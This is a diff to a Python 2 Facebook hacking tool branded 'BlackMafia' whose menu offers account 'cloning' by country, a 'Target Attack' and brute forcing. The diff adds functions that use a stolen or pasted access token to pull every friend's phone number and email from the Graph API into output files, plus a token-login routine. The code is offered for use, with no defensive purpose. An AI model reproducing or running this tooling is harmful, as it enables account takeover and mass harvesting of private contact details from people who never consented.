@@ -52,12 +52,20 @@ def cetak(b):
     x = x.replace('!0','\033[0m')
     sys.stdout.write(x+'\n')
 
-
 def jalan(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(0.001)
+
+#### colours ####
+B='\033[1;94m'
+R='\033[1;91m'
+G='\033[1;92m'
+W='\033[1;97m'
+S='\033[1;96m'
+P='\033[1;95m'
+Y='\033[1;93m'
 
 #Dev:love_hacker
 ##### LOGO #####
@@ -251,18 +259,21 @@ def menu():
 	print "	   \033[1;93m ◈••◈Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
 	print "	   \033[1;93m ◈••◈ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
 	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93m Start Cloning India"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92m Start Cloning Pakistan ID&(Group)"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96m Start Cloning Indonasia"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;95m Start Cloning USA"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94m Start Cloning Bangladash"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;93m Start Cloning All Country"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m7.\x1b[1;95m Start Cloning Member Group "
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m8.\x1b[1;92m Start Target  Attack"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m9.\x1b[1;91m Black Mafia   Massage "
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m10.\033[1;93mShow  Token"
-        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m11.\033[1;91mAfter Cloning Data Reset "
-	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m0.\033[1;91m logout "
+	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m1 .\x1b[1;93m Start Cloning India"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m2 .\x1b[1;92m Start Cloning Pakistan ID&(Group)"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m3 .\x1b[1;96m Start Cloning Indonasia"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m4 .\x1b[1;95m Start Cloning USA"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m5 .\x1b[1;94m Start Cloning Bangladash"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m6 .\x1b[1;93m Start Cloning All Country"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m7 .\x1b[1;95m Start Cloning Member Group "
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m8 .\x1b[1;92m Start Target  Attack"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m9 .\033[1;91m Start Dump    Phone Number"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m10.\033[1;91m Start Dump    Email"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m11.\x1b[1;91m Black Mafia   Massage "
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m12.\033[1;91m Login Use     Token"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m13.\033[1;93m Show  Token"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m14.\033[1;91m After Cloning Data Reset "
+	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m0 .\033[1;91m logout "
 	pilih()
 
 
@@ -290,6 +301,10 @@ def pilih():
 		print logo
 		brute()
         elif unikers =="9":
+		dump_phone()
+        elif unikers =="10":
+		dump_mail()
+        elif unikers =="11":
 		os.system('clear')
 		print logo
 		print " \033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Massage•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"
@@ -315,14 +330,16 @@ def pilih():
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
-        elif unikers =="10":
+        elif unikers =="12":
+		tokenz()
+        elif unikers =="13":
 		os.system('reset')
 		print logo
 		toket=open('login.txt','r').read()
 		print "\033[1;91m[+] \033[1;95mYour token\033[1;91m :\033[1;96m "+toket
 		raw_input("\n\033[1;91m[ \033[1;93mBack \033[1;91m]")
 		menu()
-	elif unikers =="11":
+	elif unikers =="14":
 		os.system('clear')
 		print logo
 		print " \033[1;92m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•Data Reset•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\n"
@@ -2345,6 +2362,127 @@ def brute():
             print '\x1b[1;91m[!] File not found...'
             print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect name"""
             super()
+def dump_phone():
+	print '[*] load access token'
+
+	try:
+		token = open('cookie/token.log','r').read()
+		print '[*] Success load access token'
+	except IOError:
+		print '[!] failed load access token'
+		print "[*] type 'token' to generate access token"
+		menu()
+
+	try:
+		os.mkdir('output')
+	except OSError:
+		pass
+
+	print "[*] fetching all phone numbers"
+	print '[*] start'
+
+	try:
+		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
+		a = json.loads(r.text)
+
+		out = open('output/' + n[0].split(' ')[0] + '_phone.txt','w')
+
+		for i in a['data']:
+			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
+			z = json.loads(x.text)
+
+			try:
+				out.write(z['mobile_phone'] + '\n')
+				print W + '[' + G + z['name'] + W + ']' + R + ' >> ' + W + z['mobile_phone']
+			except KeyError:
+				pass
+		out.close()
+		print '[*] done'
+		print "[*] all phone numbers successfuly retrieved"
+		print '[*] file saved : output/'+n[0].split(' ')[0] + '_phone.txt'
+		menu()
+	except KeyboardInterrupt:
+		print '\r[!] Stopped'
+		menu()
+	except KeyError:
+		print "[!] failed to fetch all phone numbers"
+		main()
+	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
+		print '[!] Connection Error'
+		print '[!] Stopped'
+		menu()
+def dump_mail():
+	print '[*] load access token'
+
+	try:
+		token = open('cookie/token.log','r').read()
+                print '[*] Success load access token'
+	except IOError:
+		print '[!] failed load access token'
+		print "[*] type 'token' to generate access token"
+		menu()
+
+	try:
+		os.mkdir('output')
+	except OSError:
+		pass
+
+	print '[*] fetching all emails'
+	print '[*] start'
+
+	try:
+		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
+                a = json.loads(r.text)
+
+		out = open('output/' + n[0].split(' ')[0] + '_mails.txt','w')
+
+		for i in a['data']:
+			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
+                        z = json.loads(x.text)
+
+			try:
+                                out.write(z['email'] + '\n')
+			        print W + '[' + G + z['name'] + W + ']' + R + ' >> ' + W + z['email']
+			except KeyError:
+				pass
+		out.close()
+
+                print '[*] done'
+                print "[*] all emails successfuly retrieved"
+		print '[*] file saved : output/' + n[0].split(' ')[0] + '_mails.txt'
+		menu()
+
+	except KeyboardInterrupt:
+		print '\r[!] Stopped'
+		menu()
+	except KeyError:
+		print "[!] failed to fetch all emails"
+		menu()
+	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
+		print '[!] Connection Error'
+		print '[!] Stopped'
+		menu()
+def tokenz():
+	os.system('reset')
+	print logo
+	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		zedd = open("login.txt", 'w')
+		zedd.write(toket)
+		zedd.close()
+		menu()
+	except KeyError:
+		print "\033[1;91m[!] Wrong"
+		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		if e =="":
+			keluar()
+		elif e =="y":
+			login()
+		else:
+			keluar()
 
 if __name__ == '__main__':
 	login()
